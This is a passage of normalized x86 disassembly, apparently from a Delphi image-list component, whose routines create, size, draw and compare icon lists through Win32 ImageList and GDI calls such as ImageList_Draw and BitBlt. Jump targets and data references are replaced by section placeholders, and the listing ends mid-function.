cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_442b94
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_441d78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441d60
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_441d78
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_441e19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_422154
mov eax ebx
call sub_421634
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41cd48
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412484
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_421634
pop edx
call sub_41d120
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441e20
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_441e3c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_441d78
pop ecx
pop edx
pop ebx
retn
sub_441e74
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_441d64
test al al
je r-xdata
mov eax esi
call sub_442534
mov eax esi
call sub_441d78
mov eax esi
mov si 0xffef
call sub_403324
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_441eb8
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_441d64
test al al
je r-xdata
mov eax esi
call sub_442534
mov eax esi
call sub_441d78
mov eax esi
mov si 0xffef
call sub_403324
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_441efc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_441f9c
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_441e3c
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403324
sub_441f48
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_442b1c
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4216a0
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_441f9c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403324
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_441f38
push eax
call ImageList_Destroy
sub_441fd4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_442067
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_441d64
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44206e
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov edx eax
mov eax ebx
call sub_442540
sub_442074
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442123
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_442106
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441d6c
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441f48
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441f48
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44210d
mov eax [ ebp - 0x10 ]
call sub_403128
retn
sub_442140
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44223f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441f48
push eax
mov eax [ ebp - 0x4 ]
call sub_441f38
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442246
mov eax [ ebp - 0xc ]
call sub_403128
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_442201
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_4224f8
mov eax [ ebp - 0x4 ]
call sub_441d6c
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_441f28
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441f48
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403128
retn
sub_44225c
push ebx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_441f38
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_442280
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442497
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441d64
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44249e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403e9c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_442b1c
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_442140
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
xor eax eax
push ebp
push sub_442448
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442428
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44240b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4223a4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_421634
call sub_41d4a0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_441f38
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_421634
call sub_41d4a0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_441f38
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_441f38
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442412
mov eax [ ebp - 0x10 ]
call sub_403128
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
sub_4424a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442527
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44225c
cmp esi eax
jl r-xdata
mov eax ebx
call sub_441d64
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
mov eax ebx
mov si 0xffef
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44252e
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
push esi
mov eax ebx
call sub_441f38
push eax
call ImageList_Remove
sub_442540
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_441b60
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403324
pop esi
pop ebx
retn
sub_442578
push ebx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_441f38
push eax
call ImageList_GetBkColor
call sub_441b80
pop ebx
retn
sub_4425a0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_441b60
push eax
mov eax ebx
call sub_442578
call sub_441b60
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41d4a0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_441f38
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_421634
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41cd48
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412484
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_421634
pop edx
call sub_41d120
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_421634
call sub_41d4a0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_441f38
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412484
mov eax [ ebx + 0x54 ]
call sub_421634
call sub_41d4a0
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41cd48
mov eax edi
call sub_41d4a0
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41cd48
mov eax edi
call sub_41d4a0
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4223a4
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_442774
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_442798
pop ebx
pop ebp
retn 0xc
sub_442798
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4427e4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412484
mov eax [ ebp - 0x4 ]
call sub_443478
xor eax eax
push ebp
push sub_44297d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442960
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_442943
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4223a4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44294a
mov eax [ ebp - 0x10 ]
call sub_403128
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_421634
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d120
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41d4a0
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_421634
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d120
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41d4a0
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_442074
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44298c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441f38
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_4427e4
sub_4429ac
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
call sub_441f9c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413e74
mov eax ebx
call sub_442534
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_442b94
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_441f38
mov edx eax
mov eax ebx
call sub_441e3c
mov eax ebx
call sub_441d64
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_441f38
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_441d6c
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441f38
push eax
call ImageList_GetBkColor
call sub_441b80
mov edx eax
mov eax ebx
call sub_442540
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44298c
jmp r-xdata
sub_442a6c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413f58
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_442b94
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_442534
mov eax esi
call sub_441f38
mov edx eax
mov eax ebx
call sub_441e3c
mov eax ebx
call sub_441d64
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_441f38
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_441d6c
jmp r-xdata
mov eax esi
call sub_441f38
push eax
call ImageList_GetBkColor
call sub_441b80
mov edx eax
mov eax ebx
call sub_442540
mov edx esi
mov eax ebx
call sub_44298c
pop esi
pop ebx
retn
sub_442b1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442b88
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442b8f
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_442bbc
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4138b8
mov si 0xffff
call sub_403324
inc ebp
dec edi
jne r-xdata
sub_442c0c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4137a8
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4138b8
cmp ebp eax
jne r-xdata
sub_442c64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407ae4
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_442ca8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44225c
mov ebx eax
mov eax edi
call sub_44225c
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44225c
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_442d84
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442d67
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_442c64
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442d6e
mov eax [ ebp - 0xc ]
call sub_403128
retn
mov eax edi
call sub_44225c
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_442d98
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44225c
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_442ca8
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_442df4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4195e8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_442d98
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442e4c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41573c
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41573c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4430d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_415510
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_415530
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4430b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
